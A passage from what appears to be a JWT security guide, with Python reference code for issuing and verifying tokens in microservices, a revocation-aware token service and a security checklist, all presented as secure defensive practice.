def issue_tokens(user_id):
    # Access token: JWT (stateless, short-lived)
    access_token = jwt.encode({
        "sub": user_id,
        "exp": datetime.now(timezone.utc) + timedelta(minutes=15),
        "iss": "auth.myapp.com",
        "aud": "api.myapp.com"
    }, SECRET, algorithm="RS256")

    # Refresh token: opaque (stored in DB, easily revocable)
    refresh_token = secrets.token_urlsafe(64)
    store_refresh_token(
        token_hash=hashlib.sha256(refresh_token.encode()).hexdigest(),
        user_id=user_id,
        expires_at=datetime.now(timezone.utc) + timedelta(days=7)
    )

    return access_token, refresh_token
```

---

### 3.3 JWT Security in Microservices

**Architecture Pattern: Gateway + Internal JWTs**

```
                    ┌──────────────────────┐
   Client ────────> │    API Gateway       │
                    │  - Verify JWT        │
                    │  - Rate limit        │
                    │  - Add internal ctx  │
                    └─────────┬────────────┘
                              │ internal JWT
               ┌──────────────┼──────────────┐
               ▼              ▼              ▼
         ┌──────────┐  ┌──────────┐  ┌──────────┐
         │ Service A │  │ Service B │  │ Service C │
         │ Verify w/ │  │ Verify w/ │  │ Verify w/ │
         │ public key│  │ public key│  │ public key│
         └──────────┘  └──────────┘  └──────────┘
```

**Secure Microservice JWT Pattern:**

```python
# SECURE: Service-level JWT verification with scope checking
import jwt
from functools import wraps
from flask import request, g

# Each service knows its own audience
SERVICE_AUDIENCE = "orders-service.internal"
GATEWAY_PUBLIC_KEY = load_public_key("/etc/keys/gateway-public.pem")

def require_auth(required_scopes=None):
    """Decorator for protected endpoints."""
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            token = request.headers.get("Authorization", "").removeprefix("Bearer ")
            if not token:
                return {"error": "missing token"}, 401

            try:
                payload = jwt.decode(
                    token,
                    GATEWAY_PUBLIC_KEY,
                    algorithms=["RS256"],
                    audience=SERVICE_AUDIENCE,
                    issuer="gateway.myapp.com",
                    options={"require": ["exp", "sub", "scope"]}
                )
            except jwt.InvalidTokenError as e:
                return {"error": "invalid token"}, 401

            # Check scopes
            if required_scopes:
                token_scopes = set(payload.get("scope", "").split())
                if not token_scopes.issuperset(required_scopes):
                    return {"error": "insufficient scope"}, 403

            g.current_user = payload["sub"]
            g.token_claims = payload
            return f(*args, **kwargs)
        return wrapper
    return decorator

# Usage:
@app.route("/api/orders", methods=["POST"])
@require_auth(required_scopes={"orders:write"})
def create_order():
    user_id = g.current_user
    # Process order...
```

**Microservice JWT Security Rules:**

1. **Gateway signs, services verify** - Only the API gateway issues JWTs; internal services only verify
2. **Asymmetric keys** - Use RS256/ES256 so services only need the public key (can't forge tokens)
3. **Audience per service** - Each service has its own `aud` value; tokens for Service A won't work on Service B
4. **Scopes for authorization** - Use `scope` claims for fine-grained access control
5. **Short TTL** - Internal tokens should be even shorter-lived (5-15 minutes)
6. **Key rotation** - Support multiple active keys via `kid` for zero-downtime rotation

---

### 3.4 Comprehensive Secure JWT Implementation

**Production-Ready JWT Service:**

```python
"""
Complete JWT service with all security controls.
Use this as a reference implementation.
"""
import jwt
import secrets
import hashlib
import logging
from datetime import datetime, timedelta, timezone
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization

logger = logging.getLogger(__name__)

class SecureJWTService:
    """Production JWT service with defense-in-depth."""

    def __init__(self, config):
        self.issuer = config["issuer"]
        self.audience = config["audience"]
        self.access_ttl = timedelta(minutes=config.get("access_ttl_minutes", 15))
        self.refresh_ttl = timedelta(days=config.get("refresh_ttl_days", 7))
        self.algorithm = "RS256"

        # Load keys
        self._private_key = self._load_private_key(config["private_key_path"])
        self._public_key = self._load_public_key(config["public_key_path"])

        # Deny-list store (Redis, database, etc.)
        self._revocation_store = config["revocation_store"]

    def _load_private_key(self, path):
        with open(path, "rb") as f:
            return serialization.load_pem_private_key(f.read(), password=None)

    def _load_public_key(self, path):
        with open(path, "rb") as f:
            return serialization.load_pem_public_key(f.read())

    def issue_access_token(self, user_id, roles, scopes=None):
        """Issue a short-lived access token."""
        now = datetime.now(timezone.utc)
        claims = {
            "sub": str(user_id),
            "roles": roles,
            "scope": " ".join(scopes or []),
            "exp": now + self.access_ttl,
            "iat": now,
            "nbf": now,
            "iss": self.issuer,
            "aud": self.audience,
            "type": "access",
            "jti": secrets.token_hex(16),
        }
        token = jwt.encode(claims, self._private_key, algorithm=self.algorithm)
        logger.info("Access token issued for user=%s jti=%s", user_id, claims["jti"])
        return token

    def verify_access_token(self, token):
        """Verify access token with full validation."""
        try:
            payload = jwt.decode(
                token,
                self._public_key,
                algorithms=[self.algorithm],
                audience=self.audience,
                issuer=self.issuer,
                options={
                    "require": ["exp", "iat", "nbf", "iss", "aud", "sub", "jti", "type"],
                    "verify_exp": True,
                    "verify_nbf": True,
                    "verify_iss": True,
                    "verify_aud": True,
                }
            )
        except jwt.ExpiredSignatureError:
            logger.debug("Expired token presented")
            raise
        except jwt.InvalidTokenError as e:
            logger.warning("Invalid token: %s", e)
            raise

        # Validate token type
        if payload.get("type") != "access":
            raise jwt.InvalidTokenError("Not an access token")

        # Check deny-list
        if self._revocation_store.is_revoked(payload["jti"]):
            logger.warning("Revoked token used: jti=%s user=%s", payload["jti"], payload["sub"])
            raise jwt.InvalidTokenError("Token has been revoked")

        # Check user-level revocation (password change, account lock)
        revoked_before = self._revocation_store.get_user_revoked_before(payload["sub"])
        if revoked_before:
            token_issued = datetime.fromisoformat(payload["iat"]) if isinstance(payload["iat"], str) \
                else datetime.fromtimestamp(payload["iat"], tz=timezone.utc)
            if token_issued < revoked_before:
                logger.warning("Pre-revocation token used: user=%s", payload["sub"])
                raise jwt.InvalidTokenError("Token issued before credential change")

        return payload

    def revoke_token(self, jti, ttl=None):
        """Add a specific token to the deny-list."""
        ttl = ttl or self.access_ttl
        self._revocation_store.revoke(jti, ttl)
        logger.info("Token revoked: jti=%s", jti)

    def revoke_all_user_tokens(self, user_id):
        """Revoke all tokens for a user (password change, compromise)."""
        self._revocation_store.set_user_revoked_before(
            user_id,
            datetime.now(timezone.utc)
        )
        logger.info("All tokens revoked for user=%s", user_id)
```

---

## Quick Reference Card

### JWT Security Checklist

```
Algorithm Safety:
[ ] Explicit algorithms list (never include "none")
[ ] Single algorithm type (don't mix HS256 and RS256)
[ ] Algorithm from config, NEVER from token header

Secret/Key Management:
[ ] 256+ bit secrets for HMAC (use secrets.token_hex(32))
[ ] RSA 2048+ or ECDSA P-256 for asymmetric
[ ] Secrets from env vars / secrets manager, never hardcoded
[ ] Separate secrets for access vs refresh tokens

Claims Validation:
[ ] exp set with reasonable TTL (15 min access, 7 day refresh)
[ ] aud validated per service
[ ] iss validated against known issuers
[ ] sub always present
[ ] jti for revocation support
[ ] type to distinguish access/refresh tokens

Token Lifecycle:
[ ] Short-lived access tokens (15 min)
[ ] Refresh token rotation on use
[ ] Deny-list for revoked tokens
[ ] All tokens revoked on password change
[ ] Logout invalidates both access and refresh

Storage & Transport:
[ ] HttpOnly + Secure + SameSite=Strict cookies
[ ] Never in URL query parameters
[ ] Never in localStorage (XSS risk)
[ ] HTTPS only
[ ] No PII in token payload

Header Safety:
[ ] Reject tokens with jwk/jku headers
[ ] Validate kid against allowlist
[ ] Never use kid in file paths or SQL queries
```

---

**Document Version:** 1.0
**Framework:** HAIAMM v2.0
**Practice:** Education & Guidance (EG)
**Domain:** Software (Lab)
**Author:** Verifhai
